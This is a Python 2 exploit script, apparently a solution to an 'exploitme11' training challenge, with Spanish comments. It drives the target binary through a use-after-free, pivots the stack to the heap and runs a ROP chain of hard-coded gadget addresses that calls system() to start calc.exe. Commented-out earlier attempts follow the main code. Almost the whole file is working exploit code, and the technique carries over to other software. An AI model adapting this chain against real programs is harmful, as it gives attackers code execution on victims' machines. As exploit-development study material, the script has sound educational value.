'''
    exploitme11 solution by @sha0coder

    - UAF 
    - rop
    - stager
    - pivot to heap
    - pivot to stack
    - system + calc
'''

import os
import struct

ulong = lambda x : struct.pack('<L', x)
slong = lambda x : struct.pack('<l', x)
rulong = lambda x : struct.unpack('I', x)[0]

def junk(n,start='A'):
    str = ''
    c = ord(start)
    for i in xrange(n):
        str += chr(c)*4
        c += 1
        if chr(c) == 'Z':
            c = ord('a')
        elif chr(c) == 'z':
            c = ord('0')
        elif chr(c) == '9':
            c = ord('A')
    return str

def dump_buffer(buff):
    for i in range(0,len(buff),4):
        print hex(rulong(padd(4,buff[i:i+4],'\x00')))
    print "%d bytes" % len(buff)


crlf = '\r\n'
trap_code = '\xcc'*40
null_ptr = ulong(0x00000000)
seh_chain = slong(-1)
seh_align = 'A'*64

addr_system = ulong(0x002e20c4)
addr_iat_system = ulong(0x00f720c4)


#REP MOV
rep_movs = [
    ulong(0x10001ed8),
    ulong(0x10001ec0), # full function
    ulong(0x100054e2),
    ulong(0x1000576d),
    ulong(0x1000589d),
    ulong(0x10008dbf),
    ulong(0x100090a0),
    ulong(0x1000c83b),
    ulong(0x1000595f)
]




seh_align = junk(14)
writable_addr = ulong(0x10011000)
call_system = ulong(0x00401139)


lea = [
    ulong(0x10005491),
    ulong(0x1000abd2),
    ulong(0x1000cc6e)
]

push_ebx = ulong(0x100019d3)


iat_longjmp = ulong(0x100122C8)
#            call eax


iat = {
    'LoadLibraryA': ulong(0x00402000), # para ir a por WinExec
    'system': ulong(0x004020c4)        # para ir directo a system (mejor saltar a call_system)
}

rop = {
    'pop ebx': ulong(0x00401149),                   # control de ebx
    'pop esi': ulong(0x004015a7),                   # control de esi
    'pop ecx': ulong(0x004014be),                   # control de ecx
    'mov eax, ecx': ulong(0x004016f5),              # control de eax mediante ecx
    'xor eax, eax': ulong(0x00401261),              # borrar eax
    'inc eax': ulong(0x00401840),                   # incrementar eax
    'mov [eax+4], ecx': ulong(0x00401895),          # escribir en memoria
    'xchg [ecx], eax # pop ebp': ulong(0x00401723), # leer de memoria
    'call esi': ulong(0x0040107c),
    'pop ecx # pop ebp': ulong(0x0040119b),
    'pop es ## call esi': ulong(0x0040133f),
    'call system': ulong(0x00401139),
    'push esp # and [eax], eax': ulong(0x00401445),
    'mov eax, [ebx] # call eax': ulong(0x00401130),
}

asm = {
    'pop ecx': '\x59',
    'pop ebx': '\x5b',
    'lea ecx, [ecx]': '\x8d\x49\x00',
    'call ecx': '\xff\x19',
    'push "calc"': '\x68\x63\x61\x6c\x63',
    'push ".exe"': '\x68\x2e\x65\x78\x65',
    'jmp call_system': ' \xe9\x79\x0f\x17\x89',
    'mov [esp], 18ff24': '\xc7\x04\x24\x24\xff\x18\x00',
}

pivot = ulong(0x00401f17)
writable = 0x00403100
stack = 0x0018ff24
buf1 = 0x00257220
param_ptr = ulong(0x00557284) #ulong(buf1+100)
orig_stack = 0x0018ff24

# globals #
ptr = writable
buff = ''
###########

def padd(n, s, b):
    l = len(s)
    for i in range(l,n):
        s += b
    return s

def push(dword):
    global buff
    buff += padd(4,  dword, '\x00')

def load_ecx(dword):
    global buff
    buff += rop['pop ecx']
    push(dword)

def load_eax(dword):
    global buff
    load_ecx(dword)
    buff += rop['mov eax, ecx']

def store_dword(where, what):
    global ptr, buff
    load_eax(ulong(where-4))
    load_ecx(what)
    buff += rop['mov [eax+4], ecx']
    ptr  += 4

def store_string(string):
    global ptr, buff
    for i in range(0, len(string), 4):
        store_dword(ptr, string[i:i+4])
    store_dword(ptr, null_ptr)

def stack_pivot():
    global buff
    buff += pivot

def init_buffer():
    global buff
    buff = ''

def end_buffer():
    global buff
    buff += crlf









BIN='EXploitme_11c.exe'
#os.environ["A"*1024] = "A"*1024
stdin, stdout = os.popen4(BIN, 't', -1)
print stdin, stdout


# WAIT DEBUGGER
print '  [+] Attach debugger and press enter.   WTF!!'
x = raw_input()
print '  [+] Sending the first buffer'


## build sytem parameter ##
init_buffer()
path = 'c:\windows\system32\\'
buff  += path
buff += '\\'*(100-len('calc.exe')-len(path))
buff += 'calc.exe\x00'
end_buffer()
dump_buffer(buff)

# WRITE BUFFER1 ( >100 para triggear el free)
stdin.write(buff) # rop stage2



# WAIT DEBUGGER
print '  [+] Attach debugger and press enter.   WTF!!'
x = raw_input()
print '  [+] Sending the second buffer'



## buf4 ##
init_buffer()
stack_pivot()                                # pivotar
store_dword(orig_stack, rop['pop ecx'])      # el stage1 escribe el stage2 en la pila anterior
store_dword(orig_stack+0x8, rop['pop ecx'])  # el stage1 escribe el stage2 en la pila anterior
store_dword(orig_stack+0x10, call_system)    # la direccion del call system sin aslr
stack_pivot()                                # despivotar
end_buffer()                                 # \r\n
dump_buffer(buff)
stdin.write(buff) # rop stage 1  call eax

print '  [+] pause, pres enter to send crlf'
raw_input()
stdin.write(crlf) # pause




print '  [+] Waiting for output ...'
print stdout.read()
stdin.close()
stdout.close()



'''
pruebas previas:

buff  = pivot                   # pivotar la pila a heap
buff += rop['pop ecx']          # ecx -> puntero a espacio de datos escribible (writable)
buff += ulong(writable-4)
buff += rop['mov eax, ecx']     # eax -> puntero a writable-4
buff += rop['pop ecx']          # ecx -> "calc"
buff += 'calc'
buff += rop['mov [eax+4], ecx'] # colocar "calc" en writable-4+4
buff += rop['pop ecx']          # ecx -> puntero a writable
buff += ulong(writable)
buff += rop['mov eax, ecx']     # eax -> puntero a writable
buff += rop['pop ecx']          # ecx -> ".exe"
buff += '.exe'
buff += rop['mov [eax+4], ecx'] # colocar ".exe" en writable+4
buff += rop['pop ecx']          # ecx -> writable+4
buff += ulong(writable+4)
buff += rop['mov eax, ecx']     # eax -> puntero a writable+4
buff += rop['pop ecx']          # ecx -> 0x00000000
buff += null_ptr
buff += rop['mov [eax+4], ecx'] # colocar \x00\x00\x00\x00 en writable+4+4
buff += rop['call system']
buff += ulong(writable)         # parametro de system
buff += crlf

stdin.write(buff)
'''
#stdin.write(pivot + rop['pop esi'] + rop['call system'] + rop['call esi'] + "calc.exe" + null_ptr + crlf)
#stdin.write(rep_movs[0] + writable_addr + null_ptr + junk(7) + writable_addr*4 + junk(2,'a') + null_ptr + junk(3,'1') + call_system + iat_longjmp + crlf)
#stdin.write(rep_movs[1] + writable_addr + null_ptr + junk(7) + writable_addr*4 + junk(2,'a') + null_ptr + junk(3,'1') + slong(-1) + call_system + crlf)

#stdin.write(lea[2] + writable_addr * 100 + crlf)


#'AAAA'*15 + slong(-1) + slong(-8) + 'AAAA'*100 + crlf)

#stdin.write(g1_stack_pivot + '3333' + 'AAAA' + writable_addr + 'CCCC' + slong(-1) + writable_addr*200 + crlf)


#stdin.write(g1_stack_pivot + 'AAAA' + null_ptr + null_ptr + null_ptr + 'CCCCDDDDEEEEFFFFGGGGHHHH' + writable_addr + writable_addr + writable_addr + writable_addr + 'AAAA' + null_ptr + junk(8) + writable_addr + 'XXXX' + crlf)
#'MMMMNNNN'  + seh_chain + rop_popEdiEsi + 'AAAA'*100 + crlf)
